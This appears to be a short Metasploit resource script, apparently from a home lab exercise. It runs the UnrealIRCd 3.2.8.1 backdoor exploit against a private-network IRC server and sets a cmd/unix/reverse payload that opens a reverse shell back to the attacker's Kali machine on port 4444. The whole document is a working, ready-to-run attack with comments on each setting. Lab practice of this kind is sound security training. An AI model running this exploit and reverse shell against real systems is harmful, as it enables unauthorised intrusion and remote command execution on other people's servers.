#This is a script to run against unreal IRC

#!/bin/bash

# use the unreal exploit
use exploit/unix/irc/unreal_ircd_3281_backdoor

# show the options required to execute the exploit
show options

#set IP of the host you are attacking
set rhost 192.168.1.52

# Port number IRC app is listening on
set rport 6667

# IP of the Kail VM you are attacking from
set lhost 192.168.1.56

# Port on your system exploit and payload runs to create session
set lport 4444

set payload cmd/unix/reverse

exploit

exit 0
